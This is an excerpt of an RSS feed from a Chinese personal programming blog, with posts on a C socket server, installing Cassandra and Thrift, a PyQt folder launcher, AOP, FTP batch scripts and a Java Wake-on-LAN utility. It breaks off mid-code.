fflush(NULL);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; thetime = time(NULL);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf(buffer, "Hello, Now is %s\n", ctime(&amp;thetime));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; send(sock_fd, buffer,strlen(buffer), 0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sock_fd);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sock_id);<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br>}<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200932712948904/</guid>
    </item>
    <item>
      <title>
<![CDATA[twissandra，使用Cassandra和django的山寨twitter]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201051192614809/</link>
      <description>
<![CDATA[前几天听网易一个工程师讲到分布式大量数据的存储，讲到了Cassandra，这几天又看了下Hadoop和MapReduce相关的东西，刚好又想把校内的数据抓下来作下分析。<br>上次用MySQL抓了500万条数据，占用了1G多的硬盘空间，后来不了了之，遗忘掉了。<br>这次改了一下表结构，继续抓，不过还是底气不足，估计最多也就抓1千万条就卡住了，刚好趁机试一个Cassandra。<br>安装倒是简单<br>直接从apache下载下来解压运行就行了，目前最新版本是0.6.2，但是所说twissandra是基于0.6.1的，所以就用了0.6.1的<br>wget http://archive.apache.org/dist/cassandra/0.6.1/apache-cassandra-0.6.1-src.tar.gz<br>tar xf apache-cassandra-0.6.1-bin.tar.gz<br>cd apache-cassandra-0.6.1<br>sudo mkdir /var/log/cassandra<br>sudo mkdir /var/lib/cassandra<br>sudo chown `whoami` /var/log/cassandra<br>sudo chown `whoami` /var/lib/cassandra<br>bin/cassandra<br>如果没有看到error消息，cassandra就成功启动了<br>然后进行cli测试<br>bin/cassandra-cli<br>set Keyspx.Standard1['hank']['age'] = '28'<br>get Keyspx.Standard1['hank']<br>quit<br><br>cassandra启动成功，接下来安装twissandra<code><span style="font-family: Arial,Helvetica,Sans-Serif;"><br>首先用git下载源代码<br>git clone git://github.com/ericflo/twissandra.git<br>然后使用twissandra的storage-conf.xml替换cassandra自带的<br>首先关掉cassandra<br>killall java<br>然后替换cassandra的配置文件<br>cp &lt;twissandra&gt;/conf/storage-conf.xml &lt;cassandra&gt;/conf/storage-conf.xml<br>启动cassandra<br>&lt;cassandra&gt;/bin/cassandra<br>启动twissandra<br>cd &lt;twissandra&gt;<br>python manage.py runserver<br>然后用浏览器访问<br>http://localhost:8000/</span></code><br><br>好像很简单，其实少写了一个很重要的步骤，python访问cassandra，需要Thrist，编译Thrist相当痛苦<br>首先下载Thrist<br>wget http://labs.renren.com/apache-mirror/incubator/thrift/0.2.0-incubating/thrift-0.2.0-incubating.tar.gz<br>tar xf thrift-0.2.0-incubating.tar.gz<br>cd thrift-0.2.0<br>./configure<br>make<br>sudo make install<br>注意：<br>1. 很多文档都说在./configure前有一步./bootstrap，但是我只要一用./bootstrap就失败了，不用反而成功<br>2. thrift需要boost包，sudo apt-get install libboost1.35-dev<br>安装好Thrift后，就可以装pycassa了，好像twissandra自带了pycassa，但我在别的地方有用，所以就装上了<br>git clone http://github.com/vomjom/pycassa.git<br>cd pycassa<br>python setup.py install<br>python setup.py --cassandra install]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201051192614809/</guid>
    </item>
    <item>
      <title>
<![CDATA[python2.6的site-packages改名为dist-packages]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201051683627407/</link>
      <description>
<![CDATA[python2.5的新包都放在site-packages目录下，但是在python2.6改放在dist-packages目录下，site-packages不再是默认的目录<br>而thrift默认安装在site-packages目录下，所以如果在python2.6的环境下安装Thrift，安装完成后，要将site-packages目录下的文件移动到dist-packages目录下<br>sudo mv /usr/lib/python2.6/site-packages /usr/lib/python2.6/dist-packages<br>Ubuntu8.04和8.10默认是python2.5环境<br>Ubuntu10.04是python2.6的环境]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201051683627407/</guid>
    </item>
    <item>
      <title>
<![CDATA[PyStart快速启动]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009101934630941/</link>
      <description>
<![CDATA[Todo:<br>1. 解决Topmost时Combox不能显示的问题<br>2. 自动隐藏<br>3. 记录历史位置和历史大小<br><br>from PyQt4.QtGui imp<wbr>ort *<br>from PyQt4.QtCore imp<wbr>ort *<br>imp<wbr>ort sys,os,pickle<br><br>class PyStart(QDialog):<br>&nbsp;&nbsp;&nbsp; def __init__(self,favorites=None):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; QWidget.__init__(self)<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.dirs=QDirModel()<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders=QListView()<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setModel(self.dirs)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setContextMenuPolicy(Qt.CustomContextMenu); <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setViewMode(QListView.IconMode)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.favor=favorites<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.lblRate=QLabel()<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath=QComboBox()<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath.setEditable(True)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; for x in self.favor.getFavorites():<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath.insertItem(0,QString(x))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #TODO:add favorites to lineedit<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; layout=QGridLayout(self)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; head=QFormLayout()<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; head.addRow(self.lblRate, self.curPath)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; layout.addLayout(head,0,0)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; layout.addWidget(self.folders,1,0)<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #self.connect(self.folders, SIGNAL('customContextMenuRequested (const QPoint&amp;)'),self.slotContextMenu)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.selectionChanged=self.slotSelectionChanged<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(self.curPath, SIGNAL('currentIndexChanged (const QString&amp;)'),self.slotUpdatePath)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(self.curPath, SIGNAL('editTextChanged (const QString&amp;)'),self.slotChangeFolder)<br>#&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.setWindowFlags(self.windowFlags()|Qt.WindowStaysOnTopHint)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.show()<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath.setCurrentIndex(0)<br><br>&nbsp;&nbsp;&nbsp; '''context menu<br>&nbsp;&nbsp;&nbsp; for view setting<br>&nbsp;&nbsp;&nbsp; '''<br>&nbsp;&nbsp;&nbsp; def contextMenuEvent(self,evt):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu = QMenu()<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.addSeparator()<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; actIcon=QAction("IconView", menu);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; actList=QAction("ListView",menu)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; actClear=QAction("ClearHistory",menu)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(actIcon,SIGNAL('triggered()'), lambda : self.folders.setViewMode(QListView.IconMode))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(actList,SIGNAL('triggered()'), lambda : self.folders.setViewMode(QListView.ListMode))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.connect(actClear,SIGNAL('triggered()'), self.slotClearHistory)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.addAction(actIcon)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.addAction(actList)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.addAction(actClear)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; menu.exec_(evt.globalPos())<br>&nbsp;&nbsp;&nbsp; def slotUpdatePath(self, path):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.lblRate.setText(QString.number(self.favor.incFavorite(path)))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setRootIndex(self.dirs.index(path))<br>&nbsp;&nbsp;&nbsp; def slotChangeFolder(self,text):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(text[-1]==os.path.sep and os.path.exists(text)):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #todo automatically list selectable items<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; print 'ok'<br>&nbsp;&nbsp;&nbsp; def slotClearHistory(self):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.curPath.clear()<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.favor.clear()<br>&nbsp;&nbsp;&nbsp; '''click a list item, and open folder or open file<br>&nbsp;&nbsp;&nbsp; '''<br>&nbsp;&nbsp;&nbsp; def slotSelectionChanged(self,selected,dselected):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; destFile=self.dirs.fileInfo(selected.indexes()[0])<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=unicode(destFile.absoluteFilePath())<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if sys.platform=='win32':<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=oscmd.replace('/','\\')<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(destFile.isDir()):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd = "start explorer "+oscmd<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd="start "+oscmd<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(destFile.isDir()):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=oscmd+"&amp;"<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oscmd=oscmd+"&amp;"<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; os.system(oscmd)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.selectionModel().reset()<br>&nbsp;&nbsp;&nbsp; '''when resized, the layout of listview is corrupt, so use this to fix it<br>&nbsp;&nbsp;&nbsp; '''<br>&nbsp;&nbsp;&nbsp; def resizeEvent(self,evt):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.folders.setViewMode(self.folders.viewMode())<br>&nbsp;&nbsp;&nbsp; def closeEvent(self,evt):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.favor.save()<br><br>class Favorite():<br>&nbsp;&nbsp;&nbsp; def __init__(self,fileName='qw.hjz'):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.fileName=fileName<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(os.path.isfile(fileName)):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; try:<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.da<wbr>ta=pickle.load(open(self.fileName))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; except:<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.da<wbr>ta={}<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.da<wbr>ta={}<br>&nbsp;&nbsp;&nbsp; def getFavorites(self):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return sorted(self.da<wbr>ta.keys(),key=lambda(k):self.da<wbr>ta[k])<br>&nbsp;&nbsp;&nbsp; def getFavorite(self,item):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; items=unicode(item)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return self.da<wbr>ta[item]<br>&nbsp;&nbsp;&nbsp; def incFavorite(self,item):&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; item=unicode(item)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.da<wbr>ta.setdefault(item,0)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.da<wbr>ta[item]+=1<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return self.da<wbr>ta[item]<br>&nbsp;&nbsp;&nbsp; def clear(self):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; self.da<wbr>ta={}<br>&nbsp;&nbsp;&nbsp; def save(self):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; pickle.dump(self.da<wbr>ta,open(self.fileName,'w'))<br><br>if __name__=='__main__':<br>&nbsp;&nbsp;&nbsp; app=QApplication([])<br>&nbsp;&nbsp;&nbsp; favorites=Favorite()<br>&nbsp;&nbsp;&nbsp; dlg=PyStart(favorites)&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; app.setActiveWindow(dlg)<br>&nbsp;&nbsp;&nbsp; app.exec_()<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009101934630941/</guid>
    </item>
    <item>
      <title>
<![CDATA[面向特征的编程AOP]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720084411151115/</link>
      <description>
<![CDATA[<P style="TEXT-INDENT: 2em;"  >目前编程中最热门的新概念是面向特征的编程（aspect-oriented programming，AOP）。AOP曾经主要用于学术和研发机构，如今开始进入主流开发领域。与OOP在面向过程的编程方法基础上的改进一样，AOP是在<A rel="nofollow" href="http://wiki.matrix.org.cn/Wiki.jsp?page=%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B"  >面向对象编程</A>（OOP）方法的基础上进行改进而来的一种创新的软件开发方法。OOP引入了封装、继承和多态性等概念来建立一种对象层次结构，用以模拟公共行为的一个集合。然而，OOP在处理范围扩展到一些无关对象的公共行为方面达不到要求。也就是说，OOP允许你定义从上到下的关系，但并不适合定义从左到右的关系。例如，看一下日志功能。日志代码往往水平地散布在所有对象层次中，而与它所散布到的对象的核心功能毫无关系。对于其他类型的代码，如安全性、异常处理和透明的持续性也是如此。这种散布在各处的无关的代码被称为横切（<A rel="nofollow" href="http://wiki.matrix.org.cn/Wiki.jsp?page=CrossCutting%E5%85%B3%E7%B3%BB"  >cross-cutting</A><IMG title="面向特征的编程AOP - hankjin - 云水居"  alt="面向特征的编程AOP - hankjin - 云水居"  src="http://wiki.matrix.org.cn/templates/brushed/scripts/iepngfix-blank.gif"  border="0" >）代码，这也是AOP编码方法产生的原因。 </P>  <P style="TEXT-INDENT: 2em;"  >AOP提供一种提取横切代码的方法，这种横切代码横跨各个对象层次，但与它所跨越的对象代码在功能上没有相关性。AOP不是在类中嵌入横切代码，而是允许你将横切代码提取到一个单独的模块中，然后在需要的时候动态地应用该代码，这个单独的模块叫做一个“特征代码”（“aspect”，也译作“标记”）。通过在你的对象模型中需要应用横切代码的地方定义特定的位置–切入点（pointcut）–来实现动态的应用横切代码。在运行或编译时，根据你的<A rel="nofollow" href="http://wiki.matrix.org.cn/Wiki.jsp?page=AOP%E6%A1%86%E6%9E%B6"  >AOP框架</A>，横切代码被插入指定的切入点。本质上说，AOP允许你在对象中引入新功能，而对象无需了解所引入的功能。这是一个非常有用的概念。 </P>  <P style="TEXT-INDENT: 2em;"  >AOP框架.实现:</P>  <P style="TEXT-INDENT: 2em;"  >Aspectj</P>  <P style="TEXT-INDENT: 2em;"  >JbossAop</P>  <P style="TEXT-INDENT: 2em;"  >Caesarj</P>  <P style="TEXT-INDENT: 2em;"  >ObjectTeamsForJava</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720084411151115/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用批处理和ftp自动上传和下载文件]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372007102734729243/</link>
      <description>
<![CDATA[@echo off <br>open hankjin.vicp.net&gt; DownFromFtp.tmp&nbsp;<br>ftpusername &gt;&gt; DownFromFtp.tmp&nbsp;<br>ftppassword &gt;&gt; DownFromFtp.tmp <br>get&nbsp;list.tar.gz D:\ftplist.tar.gz &gt;&gt; DownFromFtp.tmp <br>bye &gt;&gt; DownFromFtp.tmp <br>ftp -s:DownFromFtp.tmp <br>del DownFromFtp.tmp<br><br>#!/bin/bash<br>ftp -in myserver.com &lt;&lt;EOF<br>user hankjin mypass<br>get backup.tar.gz<br>bye<br>EOF]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372007102734729243/</guid>
    </item>
    <item>
      <title>
<![CDATA[从WPF与Eclipse看软件企业策略]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200956104647276/</link>
      <description>
<![CDATA[Eclipse的产生有一个故事，<br>传说很早很早以前，IBM使用VisuralAge for Java作为swt等的开发平台，Websphere Application Server Developer作为服务器应用程序的开发平台。两个平台的不兼容性孕育出了一个旷古奇葩Eclipse，现在IBM的几个生产线都是基于Eclipse的：Rational系列，Websphere系列，甚至古老的主机的CICS也有基于Eclipse的管理程序。不过IBM用的是内部的Eclipse版本，需要License的；而我们用的Eclipse是社区版的。秦始皇统一了度量衡，SOA统一了分布系统调用方式，Eclipse统一了IBM的开发平台。<br><br>再看WPF，第一次看到WPF，感觉这是一个很漂亮得想法，用xml来写界面。近几天用WPF得ListView进行数据绑定，写着写着突然发现这个和Asp.Net得数据绑定如出一辙，再想到WPF Application与WPF Browser Application，微软将应用程序与浏览器应用程序统一了起来。<br><br>三流的企业做产品，二流的企业做规模，一流的企业做标准。标准是什么？标准就是统一的规则。<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200956104647276/</guid>
    </item>
    <item>
      <title>
<![CDATA[在命令行下查看图片]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720095582126669/</link>
      <description>
<![CDATA[有一句话说：<br>Windows可以做的，Linux可以做；<br>有些Windows不可以做的，Linux也可以做；<br>有些Windows不可以做的，Linux也不可以做的，那是因为不值得做。<br>在命令行下看图片，貌似Windows下是不可以做的，一直一位Linux下应该可以做，因为太沉迷putty了，今天终于发现了，确实可以的， asciiview, 而且效果相当好，简直可以用来破解139邮箱的验证码了<br>sudo apt-get install asciiview<br>asciiview a.gif<br>看清除了，验证码是2CPI<br><a href="http://img.bimg.126.net/photo/GflUfVU6Z6981bgjuTUI6w==/5707749577739207079.jpg" target="_blank"><img title="在命令行下查看图片 - hankjin - 乱-Blog" alt="在命令行下查看图片 - hankjin - 乱-Blog" src="http://img.bimg.126.net/photo/GflUfVU6Z6981bgjuTUI6w==/5707749577739207079.jpg"></a><br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720095582126669/</guid>
    </item>
    <item>
      <title>
<![CDATA[网络唤醒网络开机]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720093882025878/</link>
      <description>
<![CDATA[首先要知道目标机的Mac地址, 然后将目标机的网络启动功能从BIOS里启动, <br>构造一个102位的UDP包,6个FF+16*6个MAC地址, 然后广播出去255.255.255.255. 然后就万事大吉了!<br>public class WOL4j {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static byte[] parseMac(String mac) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mac = mac.trim();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (mac.length() != 12 &amp;&amp; mac.length() != 17) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("invalid mac address");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return null;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mac = mac.replaceAll(":", "");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mac = mac.replaceAll("-", "");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!mac.matches("\\p{XDigit}{12}")) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("invalid mac address");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return null;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte[] macBytes = Tools.StrToHex(mac);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return macBytes;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static DatagramPacket createPacket(String mac, String ip) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // check mac address<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte[] destMac = parseMac(mac);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (destMac == null)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return null;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // check ip address<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String destIP = "255.255.255.255";<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!ip.equals(""))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; destIP = 